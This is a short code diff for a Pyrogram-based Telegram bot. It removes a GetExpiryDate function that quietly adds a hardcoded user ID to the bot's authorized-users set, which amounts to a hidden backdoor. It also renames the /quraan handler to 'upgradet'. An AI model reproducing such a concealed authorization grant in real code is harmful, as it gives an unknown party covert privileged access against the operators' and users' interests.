@@ -25,11 +25,6 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 from helper_funcs.chat_base import TRChatBase
 
-def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Free User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(592800547)
-    return expires_at
-
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
 async def help_user(bot, update):
@@ -71,7 +66,7 @@ async def start(bot, update):
 
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["quraan"]))
-async def quraan_text(bot, update):
+async def upgradet(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/quraan")
     await bot.send_message(
